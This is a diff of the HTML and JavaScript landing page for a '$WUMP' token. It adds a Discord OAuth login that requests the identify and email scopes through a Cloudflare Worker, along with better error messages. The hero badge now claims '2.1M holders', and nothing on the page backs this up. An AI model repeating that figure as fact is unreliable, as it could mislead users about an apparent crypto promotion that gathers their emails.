@@ -4,7 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>$WUMP</title>
-  <link rel="icon" type="image/x-icon" href="logo.ico">
+<link rel="icon" type="image/x-icon" href="logo.ico">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link href="https://fonts.googleapis.com/css2?family=gg+sans:wght@400;500;600;700&display=swap" rel="stylesheet">
 <style>
@@ -1062,7 +1062,7 @@
 <!-- NAVBAR -->
 <nav>
   <a href="#" class="nav-logo">
-    <div class="coin-icon"><img src="logo.png" alt="$WUMP logo"></div>
+    <div class="coin-icon"><img src="logo.png" alt="$WUMP logo" onerror="this.style.display='none';this.parentElement.textContent='W';"></div>
     $WUMP
   </a>
   <ul class="nav-links">
@@ -1145,7 +1145,7 @@
   
   <div class="hero-badge">
     <span class="dot"></span>
-    Live on Discord
+    Live on Discord · 2.1M holders
   </div>
   
   <h1 class="hero-title">
@@ -1419,8 +1419,8 @@
 // ═══════════════════════════════════════════════════
 //  CONFIG — update WORKER_URL after deploying the CF Worker
 // ═══════════════════════════════════════════════════
-const WORKER_URL = 'https://odd-wood-0bf3.tight-cherry-323c.workers.dev/';
-const DISCORD_OAUTH_URL = 'https://discord.com/oauth2/authorize?client_id=1478609139876888596&permissions=0&response_type=code&redirect_uri=https%3A%2F%2Fwumpcoin.github.io&integration_type=1&scope=bot+identify';
+const WORKER_URL = 'https://odd-wood-0bf3.tight-cherry-323c.workers.dev';
+const DISCORD_OAUTH_URL = 'https://discord.com/oauth2/authorize?client_id=1478609139876888596&response_type=code&redirect_uri=https%3A%2F%2Fwumpcoin.github.io&scope=identify+email';
 const DISCORD_EPOCH = 1420070400000n;
 
 // ═══════════════════════════════════════════════════
@@ -1602,9 +1602,13 @@ async function handleOAuthCallback(code) {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ code }),
     });
-    if (!resp.ok) throw new Error(`Worker returned ${resp.status}`);
+    if (!resp.ok) {
+      let detail = '';
+      try { const d = await resp.json(); detail = d.discord_error || d.detail || d.error || JSON.stringify(d); } catch {}
+      throw new Error(`Discord said: ${detail || resp.status}`);
+    }
     const data = await resp.json();
-    if (data.error) throw new Error(data.error);
+    if (data.error) throw new Error(`${data.error}: ${data.discord_error || data.detail || ''}`);
 
     // data = { access_token, user: { id, username, discriminator, avatar, verified, email } }
     let state = getState();
